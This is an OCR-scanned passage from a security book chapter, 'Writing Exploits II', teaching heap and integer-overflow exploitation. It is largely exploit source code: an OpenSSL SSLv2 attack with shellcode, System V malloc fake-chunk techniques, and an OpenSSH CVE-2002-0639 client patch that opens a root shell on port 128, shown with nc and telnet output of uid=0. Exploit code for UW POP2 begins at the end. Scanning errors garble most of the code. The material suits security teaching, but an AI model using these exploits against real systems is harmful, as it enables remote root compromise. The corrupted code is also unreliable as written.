shutdownfsd, 
1); 

Chapter 11 * Writing Exploits II 
137 
close(sd) ; 
138 
} 
139 
140 
brute_addr += A; 
141 
} 
142 
exit (0) ; 
143} 
144 
145 int 
146 populace(char *host, int port, inc num, int do_ssl, inc rand_port) 
147 ( 
148 
int iH *socks; 
149 
char buf [1024 * 3]; 
150 
char header[] = "GET / HTTP/1.G\r\nHost: "; 
151 
struct sockaddr_in sin; 
152 
153 
printf("populating shellcode..\n"); 
154 
155 
memset (buf, 0x90, sizeof (buf)); 
156 
157 
for(i = 0; i < sizeof[buf) ; i += 2) 
158 
"(short «)&buf[i) = Oxfceb; 
159 
160 
memcpy(buf, header, strlen{header)); 
161 
162 
buf [sizeof (buf) - 2] = 0x0a; 
163 
buf [sizeof(buf) - 1] = 0x0a; 
164 
buftsizeof(buf) - 0] = 0x0; 
165 
166 
shellcode[47 + 0) = (u_charl ( (rand_port » 8) Si Oxff); 
167 
shellcode [47 + 1) = (u_char)[rand_port & Oxff) ; 
168 
169 
memcpy(buf + 768, shellcode, strlen(shellcode)); 
170 
171 
sin,sin_family = AF_INET; 
172 
siru sin_port = htons {port) ; 
173 
sin. sirt_addr. s_addr = resolve (host) ; 
174 
175 
socks — malloc ( sizeof ( int) * num) ; 
176 
177 
for(i = 0; i < num; i++) { 
178 
ssl_conn *ssl; 
179 
180 
usleep(lOO) ; 
181 
182 
socks[i] = socket[AF_INET, SOCK_STREAM, 0); 
183 
i£(socks[i] < 0) ( 
184 
perror("socket()"); 
185 
return(-l)s 
186 
} 
187 
connect(socks[i] , (struct sockaddr *)&sin, sizeof{sin))j 
188 
write(socks[i] , buf, strlen(buf)); 
189 
} 
190 
191 
for(i = 0; i < num; i++) { 
192 
shutdown(socks[i]H 1) ; 
193 
close(socks[i]) ; 

Writing Exploits II • Chapter 11 
194 
> 
195 } 
196 
197 int 
198 infoleak(char *host, 
int port) 
199 { 
200 
u_char *p; 
201 
u_char buf(56]; 
202 
203 
204 
memset(buf, 
0, 
sizeof(buf)); 
205 
p = buf; 
206 
207 
/* session_id_length V 
208 
*{long *) ibuf[52] = 0x00000070; 
209 
210 print,f (" \nperforming information leak: \n") ; 
211 
212 
i f ( ] ( s s l = ssl_connect(host, port, OH) 
213 
return (-1) ; 
214 
215 
send_client_hello(ssl) ; 
216 
217 
if{get_server_hello (ssl) < 0) 
218 
return(-l); 
219 
220 
send_client_master_key{sslt 
buf, 
sizeof(bufJ); 
221 
222 
generate_keys(ssl)j 
223 
224 
if(get_server_verify(ssl) < 0) 
225 
return(-l) ; 
226 
227 
send_client_nriish(ssl) ; 
228 
get_server_finish(ssl, 
1); 
229 
230 
printfI"\ncipher\t= 0x408x\n-, 
cipher); 
231 
printf("ciphers\t= 0x%03x\n", ciphers); 
232 
233 
shutdown{s£l->sockfd, l) ; 
234 
close(SSl->SOCkfd) ; 
235 } 
236 
237 int 
238 exploit(char *host, 
int port„ u_long retloo, u_long retaddr, int rand_port) 
239 { 
240 
u_char *p; 
241 
ssl_conn *ssl; 
242 
int ij 
src_port; 
243 
u_char buf[1841, test(400]; 
244 
struct sockaddr_in sin; 
245 
246 
i f ( ! [ s s l • ssl_comnect(host, port, 
rand_port})) 
247 
return(-l) ; 
248 
249 memsetlbuf, 0x0, sizeof [buf) ) ; 
250 

468 
Chapter 11 * Writing Exploits II 
251 
p = buf; 
252 
253 
Mlong *] Sbuf[52] = 0x00000070; 
254 
255 
Mlong *) &buf[156] = cipher; 
256 
Mlong *) &bu£[164] = ciphers; 
257 
258 
Mlong *) &buf[172 + 4] = retaadr; 
259 
Mlong *) £buf[172 + 8] = retloc - 192; 
260 
261 
send_client_hello(ssl); 
262 
if(get_server_hello(ssll < 0) 
263 
r e t u r n ( - l } ; 
264 
265 
send_client_master_key(ssl, 
buf, 
sizeof(buf)); 
266 
267 
generate_keys(ssl); 
268 
269 
if(get_server_verifyfssl) < 0) 
270 
return(-l); 
271 
272 
send_client_finish(ssl) ; 
273 
274 
275 
fcntl(SSl->SOckfd, F_SETFL, O_N0NBLQCK); 
276 
277 
write(ssl->sockfdH
 
pecho -n\n", 8) ; 
278 
279 
sleep(3); 
280 
281 
read(ssl->sockfd, test, 400}; 
282 
write(ssl->sockfd, "echo -n\n", 8) ; 
283 
284 
return(ssl->sockfd); 
285 } 
286 
287 void 
288 usage(char *prog) 
289 { 
290 
printf("usage: %s [-p <port>] [-c <connects>] [-t <type>l t-s] target\n" 
291 
" 
-p\tserver port\n." 
292 
• 
-c\tnumber of connections\n" 
293 
• 
-t\ttarget type -to for lise\n" 
294 
-s\tpopulate shellcode via SSL server\n" 
295 
target\thost running vulnerable openssl\n" , prog) ,-
296 
exit (-1) i 
297 } 
System V Malloc 
The System V malloc implementation is commonly utilized in Solaris and IRIX oper-
ating systems.This implementation is structured differently than that of dlnialloc. Instead 
of storing all information in chunks, SysV malloc uses binary trees. These trees are orga-
nized such that allocated memory of equal size will be placed in the same node of the 
tree. 

Writing Exploits II • Chapter 11 
469 
typedef union _w_ { 
size„t 
w_i; 
Struct _t_ 
*w_p; 
char 
w_a[ALI<5N] t 
} WORD? 
/* structure of a node in the free tree */ 
typedef struct 
WORD 
WORD 
WORD 
WORD 
WORD 
WORD 
_t_ { 
t_s; 
t_p; 
t_l; 
l_r; 
t_n; 
t_d; 
/* size of this element */ 
/* parent node */ 
/* left child */ 
(* right child V 
/* next in link list */ 
/* dummy to reserve space for self-pointer */ 
> TREE; 
The actual structure for the tree is quite standard.The t_s element contains the size 
of the allocated chunk.This element is rounded up to the nearest word boundary, 
leaving the lower two bits open for flag use. The least significant bit in t_s is set to 1 if 
the block is in use, and 0 if it is free. The second least significant bit is checked only if 
the previous bit is set to l.This bit contains the value 1 if the previous block in memory 
is free, and 0 if it is not. 
The only elements that are usually used in the tree are the t_s, the l_p, and the l_i 
elements. User data can be found in the l_t element of the tree. 
The logic of the management algorithm is quite simple. When data is freed using 
the free function, the least significant bit in the t_j element is set to 0, leaving it in a free 
state. When the number of nodes in the free state gets maxed out, typically 32, and a 
new element is set to be freed, an old freed element in the tree is passed to the realfree 
function which deallocates it. The purpose of this design is to limit the number of 
memory frees made in succession, allowing a large speed increase. When the realfree 
function is called, the tree is re-balanced to optimize the malloc and free functionality. 
When memory is realfreed. the two adjacent nodes in the tree are checked for the free 
state bit. If either of these chunks is free, they are merged with the currently freed chunk 
and reordered in the tree according to their new size. Like dlmalloc, where merging 
occurs, there is a vector for pointer manipulation. 
Example 11.5 shows the implementation of the realfree function that is the equiva-
lent to a chimk_free in dlmalloc. This is where any exploitation will take place, so being 
able to follow this code is a great benefit. 
PPP^_. Example 11.5 The Realfree Function 
^ ^ ^ ^ ^ ^ 
1 static void 
2 realfree(void *old) 
3 t 
4 
TREE 
+tpH *spH *Hp? 
5 
size_t ts, size; 
6 
7 
COUNT(nfree) ; 
8 
9 
/* pointer to the block */ 
/* an unsigned int */ 
J* a pointer */ 
/* to force size */ 

470 
Chapter 11 * Writing Exploits II 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
t p 
t s 
i f 
= BLOCKfold); 
= S I Z E ( t p ) ; 
|!ISBIT0{ts)) 
return; 
CLRBITSOHSIZE(tp) ) ; 
/* 
i f 
) 
/* 
n p 
i f 
) 
/* 
i f 
! 
small blockH put it in the right linked l i s t *J 
ISIZE(tp) < MINSIZE) 
{ 
ASSERT(SIZEUp) 
I WORDSIZE 1= 1 ) ; 
ts = SIZEltp) 
/ WORD-SIZE - 1; 
AFTER(tp) = L i s t j t s ] ; 
L i s t [ t s ] 
= t p ; 
return; 
see if coalescing with next block is warranted ' 
= HEXT(tp) ; 
(!ISBIT0(SIZE(np))) 
{ 
if (np != Bottom) 
t_delete{np); 
SIZE(tp) += SIZE(np) + WORDSIZE; 
the same with the preceding block */ 
(ISBITl(tS)) 
{ 
np H LASTItp) ; 
ASSERT!!ISBIT0iSIZE(np)1); 
ASSERTlnp ! = Bottom); 
t_delete(np); 
SIZE(np) += SIZE(tp) + WORDSIZE; 
tp • np; 
7 
Analysis 
As seen on line number 26, realfree looks up the next neighboring chunk to the right to 
see if merging is needed. The Boolean statement on line 27 checks if the free flag is set 
on that particular chunk and that the memory is not the bottom-most chunk found. If 
these conditions are met, the chunk is deleted from the linked list. Later, the chunk sizes 
of both nodes are added together and re-added to the tree. 
To exploit this implementation, we must keep in mind that we cannot manipulate 
the header for our own chunk, only for the neighboring chunk to the right (as seen in 
lines 26 through 30). If we can overflow past the boundary of our allocated chunk and 
create a fake header, we can force t_delete to occur, thus causing arbitrary pointer 
manipulation. Example 11.6 shows one function that can be used to gain control of a 
vulnerable application when a heap overflow occurs.This is equivalent to dlmalloc's 
UNLINK macro. 
'"M»» Example 11.6 The tdelete Function 
1 
s t a t i c void 
2 
t_delete[TREE *op) 
3 ( 

Writing Exploits II * Chapter 11 
471 
4 
TREE 
*tpP *spP *gp;-
5 
6 
/* if this is a non-tree node V 
7 
if 
(ISNOTREE(op) ) 
( 
8 
tp = LINKBAK(op); 
9 
if 
( ( s p = LINKFOR(op)) 
!= NULL) 
10 
LINKBAKtspl 
= t p ; 
1 1 
LINKFOR(tp) = s p ; 
12 
return; 
13 
> 
Analysis 
In the t_delete function (line 2), pointer manipulation occurs when removing a partic-
ular chunk from the tree. Some checks are put in place first that must be obeyed when 
attempting to create a fake chunk. First, on line 7, the t_l element of op is checked to 
see if it is equal to —1. So when creating our fake chunk, the t_l element must be over-
flowed with the value of—1. Next, we must analyze the meaning of the LINKFOR and 
LINKBAK macros. 
#define 
LINKFOR(b)(((b)->t_n).w_p> 
tfdefine LINKBAK (b) (( lb) ->t_p) .w_p> 
To have our specified values work in our fake chunk, the t_p element must be over-
flowed with the correct return location. The element t_p must contain the value of the 
return location address -4 * sizeof(WORD). Secondly, the t_>i element must be over-
flowed with the value of the return address. In essence, the chunk must look like Figure 
11.11. 
/ 
t_s = number with two lower bits set to 0 
t_p = return location • 4 * sizeof(WORD) 
tj = -1 
l_r = makes no difference 
t_n = return address 
t d = makes no difference 
Figure 11.11 Fake Chunk 
If the fake chunk is properly formatted, contains the correct return location and 
return address addresses, and is overflowed correctly, pointer manipulation will occur 
allowing for arbitrary code execution in the t_delete function. Storing management 
information of chunks with the data makes this particular implementation vulnerable. 
Some operating systems use a different malloc algorithm that does not store manage-
ment information in-band with data. These types of implementations make it impossible 
for any pointer manipulation to occur by creating fake chunks. 

472 
Chapter 11 * Writing Exploits II 
Integer Bug Exploits 
Exploitable integer bugs are a source of high-risk vulnerabilities in open-source soft-
ware. Examples of critical integer bugs have been found for OpenSSH. Snort, Apache, 
the Sun KPC X!)R library, and numerous kernel bugs. Integer bugs are harder for a 
researcher to spot than stack overflow vulnerabilities, and the implications of integer cal-
culation errors are less understood by developers as a whole. 
Furthermore, almost none of the contemporary source code analyzers attempt to 
detect integer calculation errors. The majority of "source code security analyzers" imple-
ment only basic regular expression pattern matching for a list of LIBC functions that 
have security implications associated with them. Although memory allocation functions 
are usually a good place to start looking for integer bugs, such bugs are not tied to any 
one LIBC function. 
Integer Wrapping 
Integer wrapping occurs when a large value is incremented to the point where it 
"wraps" and reaches zero, and if incremented further, becomes a small value. 
Correspondingly, integer wrapping also occurs when a small value is decremented to the 
point where it "wraps" and reaches zero, and if decremented further, becomes a large 
value. The following examples of integer wrapping all reference malloc, but it is not a 
problem exclusive to LIBC, malloc, or memory allocation functions. Since integer wrap-
ping involves reaching the maximum size threshold of an integer and then wrapping to 
zero or a small number, addition and multiplication will be covered in our examples. 
Keep in mind that integer wrapping can also occur when an integer is decremented via 
subtraction or division and reaches zero or wraps to reach a large positive number. 
Example 11.7 shows addition-based integer wrapping. 
Example 11.7 Addition-Based Integer Wrapping 
1 Winclude <stdio.h> 
2 
if include <stdlib.h> 
3 
4 
int main(void) 
5 ( 
6 
unsigned int i, lengthl, length2; 
7 char *bu£; 
8 
9 // largest 32-bit unsigned integer value in hex. 4294967295 in decimal 
10 lengthl = OxtEtrtfft; 
11 length2 = Oxl; 
12 
13 // allocate enough memory for the length plus the one byte null 
14 bu£ = (char *)malloc(lengthl+length2); 
15 
16 // print the length in hex and the contents of the buffer 
17 printf(*lengthl: %x\tlength2: %x\ttotal: %xVtbuf: %s\n', lengthl, length2, 
lengthl + length2, buf) ; 
18 
19 // incrementally fill the buffer with "A" until the length has been reached 

Writing Exploits II • Chapter 11 
473 
20 for(i=0; i<lengthl; i++) buffi) = 0x41; 
21 
22 // set the last byte of the buffer to null 
23 bufti] = 0x0; 
24 
25 // print the length in hex and the contents of the buffer 
26 printf("lengthl: %x\tlength2: %x\ttotal: %x\tbuf: %s\n", lengthl, Iength2, 
lengthl+length2, bufl; 
27 
28 
return 0; 
29 } 
Analysis 
In lines 10 and 11, the two length variables are initialized. In line 14, the two integers 
.ire added together to produce a total buffer size, before performing memory allocation 
on the target buffer.The length /variable has the value Oxflffffff, which is the largest 32-
bit unsigned integer value in hex. When " 1 " , stored in length.!, is added to length], the 
size of the buffer calculated for the malloc call in line 14 becomes zero. This is because 
Oxfffrffff+1 is 0x100000000, which wraps back to 0x00000000 (0x0 or zero); hence 
integer wrapping. 
The size of the memory allocated for the buffer (buf) is now zero. In line 20, the for 
loop attempts to write 0x41 (the letter "A" in hex) incrementally until the buffer has 
been filled (it does not account for length2, because length2 is meant to account for a 
one-byte NULL). In line 23, the last byte of the buffer is set to null.This code can be 
directly compiled and it will crash.The crash occurs because the buffer is set to zero, yet 
4294967295 (Oxfrffffff in hex) letter "A"s are trying to be written to a zero length 
buffer.The length! and lengthl variables can be changed such that length! is Oxfrfrrffe and 
letigth2 is 0x2 to achieve identical behavior, or length 1 can be set to 0x5 and length! as 
0x1 to achieve "simulated normal behavior." 
Example 11.7 may seem highly constructed and inapplicable since it allows for no 
user interaction and immediately crashes in a "vulnerable" scenario. However, it displays 
a number of critical points to integer wrapping and mirrors real-world vulnerabilities. 
For instance, the malloc call in line 14 is more commonly seen as buf — (char 
*)malloc(lengthH-1).The " 1 " in this case would be meant solely to account for a 
trailing NULL byte. Ensuring that all strings are NULL terminated is a good defensive 
programming practice that, if ignored, could lead to stack overflow or a heap corruption 
bug. Furthermore, length!, in a real application, would obviously not be hard-coded as 
Oxffffffff. Normally, in a similar vulnerable application, length! would be a value that is 
calculated based upon "user input."The program would have this type of logic error 
because the programmer would assume a "normal" value would be passed to the appli-
cation for the length, not an overly large value like 4294967295 (in decimal). Keep in 
mind that "user input" could be anything from an environment variable, an argument to 
a program, a configuration option, the number of packets sent to an application, a field 
in a network protocol, or nearly anything else. To fix these types of problems, assuming 
the length absolutely must come from user input, a length check should occur to ensure 
that the user-passed length is no less than, or no greater than, programmer-defined real-

Chapter 11 * Writing Exploits II 
is tic lengths. The multiplication integer wrapping bug in Example 11.8 is very similar to 
the addition integer wrapping bug. 
Example 11.8 Multiplication-Based Integer Wrapping 
1 # include <stdio.h> 
2. #include <stdlib.h> 
3 
4 
int main(void) 
5 { 
6 
unsigned tilt i, lengthl, length2; 
7 char *buf; 
8 
9 // (i0xf£££f££f)/5) 32-bit unsigned integer value in hex, 1073741B24 in decimal 
10 lengthl = 0x33333333; 
11 length2 = 0x5; 
12 
13 // allocate enough memory for the length plus the one null byte 
14 buf B (char *)malloc((lengthl'length2)+1); 
15 
16 // print the length in hex and the contents of the buffer 
17 printf("lengthl; %x\tlength2: %x\ttotal: %x\tbuf: %s\n", lengthl, length2, 
[lengthl*length2)+1, bufJ; 
18 
19 // incrementally fill the buffer with "A- until the length has been reached 
20 
for(i=0; 1< (lengthl*length2); i++) bufli] = 0x41; 
21 
22 
// set the last byte of the buffer to null 
23 buf[i) = 0x0; 
24 
25 
// print the length in hex and the contents of the buffer 
26 printfClengthl; %x\tlength2: %x\ttotal: %x\tbuf: %s\n", lengthl, length2, 
Ilengthl*length2)+1, buf); 
27 
28 
return Q; 
29 } 
Analysis 
The two length buffers (lengthl and length!) are multiplied together to form a buffer size 
that is added to 1 (to account for a trailing NULL in the string).The largest 32-bit 
unsigned integer value before wrapping to reach zero is OxfrrfHff. In this case, length2 (5) 
should be thought of as a hard-coded value in the application. Therefore, for the buffer 
size to wrap to zero, lengthl must be set to at least 0x33333333 because 0x33333333 
multiplied by 5 is Oxffffffff. The application then adds the 1 for the NULL and with the 
integer incremented so large, it loops back to zero; as a result, zero bytes are allocated for 
the size of the buffer. Later, in line 20 of the program, when the for loop attempts to 
write to the zero length buffer, the program crashes.This multiplication integer wrap-
ping bug, as we will see in greater detail in Examples 1 1.9 and 1 1.10, is highly similar to 
the exploitable multiplication integer wrapping bug found in OpenSSH. 

Writing Exploits II • Chapter 11 
475 
Bypassing Size Checks 
Size checks are often employed in code to ensure that certain code blocks are executed 
only if the size of an integer or string is greater than, or less than, a certain other variable 
or buffer. Furthermore, people sometimes use these size checks to protect against the 
integer wrapping bugs described in the previous section.The most common size check 
occurs when a variable is set to be the maximum number of responses or buffer size, to 
ensure the user has not maliciously attempted to exceed the expected size limit.This 
tactic affords anti-overflow protection. Unfortunately for the defensive programmer, even 
a similar less than, or greater than, sign can have security implications and requires addi-
tional code or checks. 
In Example 11.9, we see a simple example of how a size check could determine 
code block execution and, more importantly, how to bypass the size check utilizing 
integer wrapping. 
I_ Example 11.9 Bypassing an Unsigned Size Check with Integer Wrapping 
— 
1 
#include <scdio.h> 
2 
3 
int m^in(void) 
4 
( 
5 
unsigned i n t nutri; 
6 
7 num = Oxffffffff; 
8 num++; 
9 
10 ifdium > 512) 
11 ( 
12 printf("Too large, exiting.\nH); 
13 return ~1? 
14 } else { 
1 5 
printf ("Passed size test. \u*) ; 
16 > 
17 
1 8 
r e t u r n 0 ; 
19 ) 
Analysis 
You can think of line 7 as the "user influenced integer." Line 6 is a hard-coded size 
manipulation, and line 10 is the actual test, line 10 determines if the number requested 
(plus one) is greater than 512; in this case, the number is actually (per line 7) 
4294967295. Obviously, this number is far greater than 512, but when incremented by 
one, it wraps to zero and thus passes the size check. 
Integer wrapping does not necessarily need to occur for a size check to be bypassed, 
nor does the integer in question have to be unsigned. Often, the majority of real-world 
size bypass check problems involve signed integers. Example 11.10 demonstrates 
bypassing a size check for a signed integer. 

476 
Chapter 11 * Writing Exploits II 
[iYN^.tiii Example 11.10 Bypassing a Signed Size Check Without Integer Wrapping 
1 
((include <st<3io.h> 
2 
#include <stdlib.h> 
3 
((include ^string.h> 
4 
5 
((define BUFSIZE 1024 
6 
7 int main(int argcr char *argvf]J 
8 ! 
9 
char inputbuf[BUFSIZE] = {0!, outputbuf IBUFSIZE) = {0},-
10 int nuitl, limit = BUFSIZE; 
11 
12 
if (argc t= 3) return - 1 ; 
13 
14 strncpy(inputbuf, argv[2], BUFSIZE-ll; 
1 5 num = atoi (argvll] ) ; 
16 
17 
printF("num: %x\tinputbuf: %s\n11, riiM, inputbuf); 
18 
19 
i f (num > 1 imi t) 
20 
! 
21 
printf("Too large, exiting. \n") j 
22 
return - 1 ; 
23 
} else { 
24 
memcpy(outputbuf„ 
inputbuf, num); 
25 
printf("cm tputbuf: %£\nn, outputbuf); 
26 
} 
27 
28 
return 0; 
29 
} 
Analysis 
By default, all integers are signed unless otherwise explicitly unsigned. However, be 
aware that "silent" typecasting can also occur.To bypass the size check seen in line 19, all 
one needs to do is enter a negative number as the first argument to the command-line 
Unix program. For example, try running: 
$ gec -o example example.c 
5 ./example -200 'perl -e 'print -A-i^DOO1' 
In this case, the trailing "A" characters will not reach the output buffer because the 
negative 200 will bypass the size check at line 19, and a heap overflow will actually 
occur as memcpy attempts to write past the buffer's limit. 
Other Integer Bugs 
Integer bugs can also occur when comparing 16-bit integers to 32-bit integers, whether 
knowingly or unknowingly. This type of error, however, is less commonly found in pro-
duction software because it is more likely to be caught by either quality assurance or an 
end user. When handling UNICODE characters or implementing wide character string 
manipulation functions in Win32, buffer sizes and integer sizes need to be calculated dif-
ferently as well. 

Writing Exploits II • Chapter 11 
477 
Although the integer wrapping bugs presented earlier were largely based around 
unsigned 32-bit integers, the problem and dynamics of integer wrapping can be applied 
to signed integers, short integers, 64-bit integers, and other numeric values. 
Typically, for an integer bug to lead to an exploitable scenario, which usually ends 
up being a heap or stack overflow, the malicious end user must have either direct or 
indirect control over the length specifier. It is somewhat unlikely that the end user will 
have direct control over the length, such as being able to supply an unexpected integer 
as a command-line argument, but it can happen. Most likely, the program will read the 
integer indirectly from the user by way of making a calculation based on the length of 
data entered or sent by the user, or the number of times sent; as opposed to the applica-
tion simply being fed a number directly from the user. 
Case Study: OpenSSH 
Challenge Response Integer Overflow 
Vulnerability CVE-2002-0639 
A vulnerability was discovered in the authentication sequence of the popular OpenSSH 
application. In order to exploit this vulnerability, the skey and bsdauth authentication 
mechanisms must be supported in the SSH server application. Most operating systems 
do not have these two options compiled into the server. However, OpenBSD has both 
of these features turned on by default. 
ogg Vulnerability Details 
This OpenSSH vulnerability is a perfect example of an integer overflow vulnerability. 
The vulnerability is caused by the following snippet of code: 
1 nresp = packet_get_int(J; 
2 if (nresp > 0) ( 
3 
response - xmalloc(nresp * sizeof(char*)]? 
4 
for (i = 0; i * nresp; i++J { 
5 
response[i] = pac*:et_get_string(NULLI ; 
6 
) 
7 } 
An attacker has the ability to change the value of nresp (line 1) by modifying the 
code in the OpenSSH client. By modifying this value, one can change the amount of 
memory allocated by xmalloc (line 3). Specifying a large number for nresp, such as 
0x40000400, prompts an integer overflow, causing xmalloc to allocate only 4096 bytes of 
memory. OpenSSH then proceeds to place values into the allocated pointer array (lines 
4 through 6), dictated by the value of nresp (line 4), causing heap space to be over-
written with arbitrary data. 
Exploitation Details 
Exploitation of this vulnerability is quite trivial. OpenSSH uses a multitude of function 
pointers for cleanup functions. All of these function pointers call code that is on the 

478 
Chapter 11 * Writing Exploits II 
heap. By placing shellcode at one of these addresses, you can cause code execution, 
yielding remote root access. 
Example output from sshd running in debug mode Isshd -add): 
debugl: auth2_challenge_start: trying authentication method 'bsdauth1 
Postponed keyboard-interactive for test from 127.0.0.1 port 19170 ssh2 
buffer_get: trying to get more bytes 4 than in buffer 0 
debugl: Calling cleanup 0x62000 10x0) 
We can therefore cause arbitrary code execution by placing shellcode at the heap 
address 0x62000.This is trivial to accomplish and is performed by populating the heap 
space and copying assembly instructions directly. 
TiTJTTTT 
Christophe Devine (devine@iie.cnam.fr) has written a patch for OpenSSH that 
includes exploit code. His patch and instructions follow. 
1 1. Download openssh-3.2.2pl.tar.gz and untar it 
2 
3 
- $ tar -xvsf openssh-3 .2 ,2pl. tarr.gz 
4 
5 2. Apply the patch provided below by running: 
6 
7 -/openssh-3.2.2pl S patch < path_to_diff_file 
8 
9 3, Compile the patched client 
10 
11 -/openssh-3,2.2pl S ./configure && make ssh 
12 
13 4. Run the evil ssh: 
14 
15 -/openssh-3.2,2pl S ./ssh root;skey@localhost 
16 
17 S. If the sploit worked, you can connect to port 128 in another terminal: 
18 
19 - } nc localhost 128 
20 uname -a 
21 OpenBSD nice 3.1 GENERIC#59 i386 
22 id 
23 
uid=0(root) gid=0(wheel) groups=0(wheel) 
24 
25 
ashconnect2.c 
Sun Mar 31 20:49:39 2002 
26 
+ + + evil-ssheonnect2 . c 
Fri Jun 2B 19:22:12 2 002 
27 
@@ - 8 3 9 , 6 +839,56 @@ 
28 /* 
29 
* parse INFO_REQuEST, prompt user and send INFO^RESPONSE 
30 
V 
31 • 
32 
-Kint do_syscall ( int nb_argsr int syscall_num, . . + ) ; 
33 • 
34 
+void shellcode( void J 
35 •( 
36 
-i- 
int servex_sock, client_sockr len? 
37 
• 
struct sQckaddr_in server_addr -r 
38 
* 
char rootshell(12]t *argv(2], *envp[I); 
39 • 
40 + 
server_sock = do_syscallI 3, 97, AF_1HET, SOCK_STREAM, 0 ) ; 
41 + 
server addr.sin addr.s addr • 0; 

Writing Exploits II • Chapter 11 
479 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
7S 
t 
-
t 
16 ) 
•• 
-
-
-
-
V 
+ 
-
-
-
f 
f 
+ 
+} 
-
+ int 
• { 
• 
-
+ 
-
+ 
-
-
-
-
+ 
+ 
4 
+ 
+ 
-
t 
s e r v e r _ a d d r . s i n _ p o r t = 32763; 
s e r v e r _ a d d r + s i n _ f a m i l y = AF_INET; 
d o _ s y s c a l l { 3, 
104, 
s e r v e r _ s o c k , 
( s t r u c t sock 
d o _ s y s c a l l { 2, 
106, s e r v e r _ s o c k , 
1 J; 
c l i e n t _ s o c k = d o _ s y s c a l l ( 3, 
30, 
s e r v e r _ s o c h , 
&server_addr H 
&len )j 
d o _ s y s c a l l { 2, 
90, client_sock H 
0 }j 
d o _ s y s c a l l { 2, 90, client_sock H 1 } -t 
d o _ s y s c a l l { 2, 
BOr c l i e n t _ s o c k , 2 }; 
* ( i n t *) 
( r o o t s h e l l + 0 ) = 0x6E69622F; 
* 
( i n t *) 
( r o o t s h e l l + 4 1 = 0x0068"732f; 
* t i n t *) 
{ r o o t s h e l l + 8 ) = 0; 
argv[0] 
= r o o t s h e l l j 
a r g v ( l ] 
- 0; 
envp(0) 
- 0; 
d o _ s y s c a l l { 3, 
59, 
r o o t s h e l l , 
argv, 
envp ); 
d o _ s v s c a l l ( 
i n t nb_args H 
i n t syscall_num, 
, . . 
i n t r e t ; 
asm( 
'mov 
S(%ebp}, %eax? 
" 
-add 
$3,%eax? 
• 
•shl 
$2,%eax? 
• 
"add 
%ebpj %eax; 
• 
'mov 
8(%ebp), %ecx; 
" 
•push_args t " 
•push 
(%eax); 
" 
*sub 
$4, %eax; 
1l 
*loop 
push_args; * 
•mov 
12(%ebp), %eax; 
1l 
"pUSh 
$Q; " 
" i n t 
S0x80; 
" 
•mov 
%eax,-4(%ebp}" 
); 
k) 
&server_eiddrH 
( s t r u c t sockaddr *) 
7 9 
+ 
r e t u r n [ 
r e t 
) ; 
8 0 • > 
81 
* 
8 2 
void 
8 3 
i n p u t _ u s e r a u t h _ i n f o _ r e q ( i n t 
type, 
u _ i n t 3 2 _ t seq, 
v o i d * c t x t ) 
8 4 
{ 
85 
@@ - 6 6 5 , 7 + 9 1 5 , 7 @@ 
86 
x f r e e ( i n s t ) ; 
8 7 
x f r e e ( l a n g ) ; 
88 
89 
- 
num_prompts = p a c k e t _ g e t _ i n t ( ) ; 
90 
+ 
num_prompts = 1073741824 + 1024; 
91 
/• 
92 
* Begin to build info response packet based on prompts requested, 
93 
* We commit to providing the correct number of responses, so if 
94 
m -874,6 +924,13 88 
95 
*/ 
96 
packet_start(SSH2_MSG_USERAUTH_INFO_RESPOUSE); 
97 
p a c k e t _ p u t _ i n t (nujm_prompts) ; 
98 + 

Chapter 11 * Writing Exploits II 
99 
+ 
f o r t i = 0; i •= 1045; i + + ) 
100 + 
packet_put_cstring ( "xxxxxxxxxx" ) ; 
101 * 
102 , 
packet_put_string( shellcode, 2047 } ; 
103 * 
packet_send(); 
104, 
return? 
105 
106 
debug2("inpu t_u serauth_ i n f o_r eq: num_p romp t s %d" H num_j? rompt s); 
107 
for ii - 0; i < num_prompts; i++) ( 
I lere is a full exploitation example using a modified ssh client containing exploit 
code: 
1 $ ssh root:skey8127.Q.0.1£ 
2 
$ telnet 127.0,0.1 128 
3 id; 
4 uid=0 (root) gid=0 (wheel) 
5 
This exploit sets the value of the nresp variable to 0x4000040(1, causing nialloc to 
allocate 4096 bytes of memory. At the same time, the the loop continues to copy data 
past the allocated buffer onto the heap space. OpenSSH uses many function pointers 
that are found on the heap following the allocated buffer. This exploit then proceeds to 
copy the shellcode directly onto the heap in hopes that it will be executed by the SSH 
cleanup functions, which is the case most of the time. 
Case Study: UW POP2 Buffer 
Overflow Vulnerability CVE-1999-0920 
A buffer overflow exists in versions 4.4 and earlier of the University of Washington's 
POP2 server. Exploitation of this vulnerability yields remote access to the system with 
the user ID of "nobody." 
Vulnerability Details 
The vulnerability is caused by the following snippet of code: 
1 
short c_fold (char *t) 
2 ( 
3 
unsigned long i,j; 
4 
char * s,tmp[TMPLEN j; 
5 
if(!(tfi:&*t}){ 
/* make sure there's an argument */ 
6 
puts ("- Missing mailbox name\015"); 
7 
return DONE; 
8 
) 
9 
f* expunge old stream */ 
10 
if (stream && nmsgsl mail_expunge (stream) ; 
nmsgs = 0; 
/* no more messages */ 
12 
if (msg) fs_give ( (void **) &msg) ; 
13 
/* don't permit proxy to leave IMAP V 
14 
if (stream && strearn->mailbox && (s = strchr (stream->mailbox,h}H) ) } { 
1 5 
strncpy (tmp,stream-^mailbox,i = f ++s - stream->mailbox>J; 
1 6 
strcpy (tmp+i,t); 
/* append mailbox to initial spec */ 
17 
t = tmp; 
18 | 

Writing Exploits II • Chapter 11 
481 
On line 16, a strcpy is performed, copying the user-supplied argument, referenced by 
the pointer "t" into the buffer tmp. When a malicious user issues the FOLD command 
to the POP2 server with a length greater than TMPLEN, the stack is overflowed, 
allowing for remote compromise. In order to trigger this vulnerability, the attacker must 
instruct the POP2 server to connect to a trusted IMAP server with a valid account. 
Once this "anonymous proxy" is completed, the FOLD command can be issued. 
When the overflow occurs, the stack is overwritten with user-defined data, causing 
the saved value of eip on the stack to be modified. I3y crafting a buffer that contains 
NOPS, shellcode, and return addresses, an attacker can gain remote access.This particular 
vulnerability, when exploited, gives access as the user "nobody." Code for this exploit 
follows: 
#include <stdio.h> 
2 
#include <errno.h> 
3 #include <unistd.h> 
4 
#include <string.h> 
5 #include <stdlib.h> 
6 
#include <netdb.h> 
7 
#include <netinet/in.h> 
8 
#include <sys/socket ,h> 
9 
10 
